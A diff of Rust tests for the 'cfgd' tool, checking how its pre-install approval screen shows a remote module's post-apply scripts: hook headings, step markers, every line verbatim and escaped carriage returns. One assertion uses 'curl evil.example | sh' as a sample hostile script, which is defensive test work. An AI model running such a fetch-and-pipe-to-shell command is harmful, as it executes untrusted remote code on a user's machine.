@@ -5305,6 +5305,14 @@ fn print_module_review_summary_warns_on_post_apply_scripts() {
         "explicit warning text: {out}"
     );
     assert!(
+        out.contains("postApply"),
+        "the hook heads its steps, spelled as the YAML spells it: {out}"
+    );
+    assert!(
+        out.contains("1/1"),
+        "the step states its position among its hook's steps: {out}"
+    );
+    assert!(
         out.contains("curl evil.example | sh"),
         "script body verbatim: {out}"
     );
@@ -5329,7 +5337,8 @@ fn print_module_review_summary_omits_empty_sections() {
     let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(!out.contains("Packages"), "no packages section: {out}");
     assert!(!out.contains("Files"), "no files section: {out}");
-    assert!(!out.contains("Post-apply"), "no scripts section: {out}");
+    assert!(!out.contains("Post-apply"), "no scripts warning: {out}");
+    assert!(!out.contains("postApply"), "no hook section: {out}");
 }
 
 #[test]
@@ -5631,14 +5640,12 @@ fn has_second_non_empty_line_shared_predicate_matches_both_review_surfaces() {
 
 #[test]
 fn upgrade_diff_trailing_newline_script_change_renders_as_single_bullet_not_code_block() {
-    // Mirrors `print_module_review_summary_trailing_newline_script_renders_as_single_bullet`
-    // but for the sibling upgrade-diff surface (`cmd_module_upgrade`'s
-    // "Changes" section) — this surface previously gated on raw
-    // `change.contains('\n')`, which disagreed with
-    // `print_module_review_summary`, so a `run: |` single-logical-line
-    // `postApply script` diff (whose `run_str()` carries a trailing `\n`)
-    // rendered as a code block here while the pre-approval review rendered
-    // the identical body as a bullet.
+    // The upgrade-diff surface (`cmd_module_upgrade`'s "Changes" section)
+    // embeds a changed script body in a change line, and used to gate on raw
+    // `change.contains('\n')`: a `run: |` single-logical-line `postApply
+    // script` diff, whose `run_str()` carries a trailing `\n`, then rendered
+    // as a code block while the identical body rendered as a bullet one
+    // surface over.
     let old = make_loaded_module("m", config::ModuleSpec::default());
     let new = module_with_post_apply_script("echo hello\n");
     let changes = modules::diff_module_specs(&old, &new, "->");
@@ -5666,8 +5673,11 @@ fn module_with_post_apply_script(run: &str) -> modules::LoadedModule {
     )
 }
 
+/// The composer renders every step the same way, so a one-line body is its
+/// marker and its highlighted body too: no bullet glyph, and no `$ ` prompt
+/// the body did not declare.
 #[test]
-fn print_module_review_summary_single_line_script_renders_as_bullet() {
+fn print_module_review_summary_single_line_script_renders_its_body_through_the_composer() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("echo hello");
@@ -5675,13 +5685,17 @@ fn print_module_review_summary_single_line_script_renders_as_bullet() {
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
-        out.contains("- $ echo hello"),
-        "expected bullet line: {out}"
+        out.contains("    1/1\n    echo hello"),
+        "expected the marker above the body: {out:?}"
+    );
+    assert!(
+        !out.contains("$ echo hello") && !out.contains("- echo hello"),
+        "a step is neither prompted nor bulleted: {out:?}"
     );
 }
 
 #[test]
-fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet() {
+fn print_module_review_summary_trailing_newline_script_renders_one_body_line() {
     // The `run: |` YAML block-scalar shape: `run_str()` returns the line plus
     // a trailing `\n`. This is the exact case that used to reach `bullet()`
     // with an embedded newline and trip the `write_line` debug_assert.
@@ -5691,19 +5705,15 @@ fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet(
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(
-        out.contains("- $ echo hello"),
-        "expected trimmed bullet line: {out}"
-    );
     assert_eq!(
-        out.matches("$ echo hello").count(),
+        out.matches("echo hello").count(),
         1,
         "trailing newline must not produce a second rendered line: {out}"
     );
 }
 
 #[test]
-fn print_module_review_summary_leading_blank_line_script_renders_as_single_bullet() {
+fn print_module_review_summary_leading_blank_line_script_renders_its_body() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("\necho hello");
@@ -5711,28 +5721,136 @@ fn print_module_review_summary_leading_blank_line_script_renders_as_single_bulle
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
-        out.contains("- $ echo hello"),
-        "expected trimmed bullet line: {out}"
+        out.contains("echo hello"),
+        "the declared body renders: {out}"
     );
 }
 
 #[test]
 fn print_module_review_summary_multi_line_script_renders_every_line_verbatim() {
-    // Genuine multi-line scripts must stay verbatim via `code_block` (not
-    // condensed to a single line) — this is the pre-install security review
-    // of a remote module's script, so nothing after the first line may be
-    // hidden from the user.
+    // The pre-install security review of a remote module's script, so every
+    // line shows: a body condensed to its first line hides the rest of what
+    // the operator is approving.
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("echo one\necho two");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(out.contains("$ echo one"), "first line verbatim: {out}");
-    assert!(out.contains("$ echo two"), "second line verbatim: {out}");
     assert!(
-        !out.contains("- $ echo one") && !out.contains("- $ echo two"),
-        "multi-line script must render via code_block (no bullet dash), not condensed: {out}"
+        out.contains("    echo one\n    echo two"),
+        "both lines, in order and unprompted: {out:?}"
+    );
+    assert!(
+        !out.contains("- echo one") && !out.contains('\u{2026}'),
+        "a reviewed body is neither bulleted nor condensed: {out:?}"
+    );
+}
+
+/// The approval screen a remote module's post-apply steps reach, rendered by
+/// the one Scripts composer: the warning row states how many bodies follow,
+/// then the hook heads its steps as `cfgd module show --scripts` heads them,
+/// each step stating its knobs above its highlighted body. A `\r` inside a
+/// body shows as `\x0d` rather than returning the cursor over the line the
+/// operator is reading.
+#[test]
+fn a_remote_modules_post_apply_steps_reach_the_approval_screen_through_the_composer() {
+    let (printer, buf) = cfgd_core::output::Printer::for_test_with_theme_colored(
+        cfgd_core::output::Theme::preset("dracula").expect("dracula is a registered preset"),
+        cfgd_core::output::Verbosity::Normal,
+    );
+    let module = make_loaded_module(
+        "nvim",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                post_apply: vec![
+                    cfgd_core::config::ScriptEntry::Full(cfgd_core::config::ScriptCommand {
+                        run: "set -eu\nif ! command -v jq >/dev/null; then\n  echo \"jq missing\" >&2\n  exit 1\nfi".into(),
+                        timeout: Some("120s".into()),
+                        continue_on_error: Some(true),
+                        ..Default::default()
+                    }),
+                    cfgd_core::config::ScriptEntry::Simple("jq --version\r\n".into()),
+                ],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(
+        &printer,
+        "nvim",
+        &module,
+        "c0ffee",
+        "sha256:dec0",
+    );
+    drop(printer);
+    // raw-capture-ok: the escapes are half of what this test claims — a stripping read removes exactly what it compares
+    let raw = buf.lock().unwrap_or_else(|e| e.into_inner()).clone();
+
+    let lines: Vec<&str> = raw.lines().collect();
+    let warning = lines
+        .iter()
+        .position(|l| l.contains("Post-apply scripts (2)"))
+        .unwrap_or_else(|| panic!("the warning row states how many bodies follow: {raw:?}"));
+    assert!(
+        lines[warning].contains("these will execute on your machine:"),
+        "the warning row keeps its wording: {:?}",
+        lines[warning]
+    );
+    // The hook heading sits at the warning row's own depth, and its name is the
+    // one the YAML spells.
+    assert!(
+        cfgd_core::output::strip_ansi(lines[warning + 1]) == "  postApply",
+        "the hook heads its steps: {:?}",
+        lines[warning + 1]
+    );
+    assert!(
+        lines[warning + 1].contains('\u{1b}'),
+        "the heading carries the preset's coat: {:?}",
+        lines[warning + 1]
+    );
+    assert_eq!(
+        cfgd_core::output::strip_ansi(lines[warning + 2]),
+        "    1/2 \u{b7} timeout 120s \u{b7} continueOnError",
+        "the step states its position and the knobs it declares: {:?}",
+        lines[warning + 2]
+    );
+    let body = &lines[warning + 3..warning + 8];
+    assert_eq!(
+        body.iter()
+            .map(|l| cfgd_core::output::strip_ansi(l))
+            .collect::<Vec<_>>(),
+        vec![
+            "    set -eu",
+            "    if ! command -v jq >/dev/null; then",
+            "      echo \"jq missing\" >&2",
+            "      exit 1",
+            "    fi",
+        ],
+        "every line of the body, in order: {raw:?}"
+    );
+    for line in body {
+        assert!(
+            line.ends_with("\u{1b}[0m"),
+            "a highlighted line closes on a reset: {line:?}"
+        );
+        assert!(
+            !cfgd_core::output::strip_ansi(line)
+                .trim_start()
+                .starts_with("$ "),
+            "a body carries no prompt it did not declare: {line:?}"
+        );
+    }
+    let stripped = cfgd_core::output::strip_ansi(&raw);
+    assert!(
+        stripped.contains("    jq --version\\x0d"),
+        "a carriage return shows as text rather than returning the cursor: {stripped:?}"
+    );
+    cfgd_core::output::test_capture::assert_snapshot_at(
+        &cfgd_core::test_helpers::workspace_root().join("crates/cfgd/tests/output_snapshots"),
+        "module_add/post_apply_review.txt",
+        &stripped,
     );
 }
 
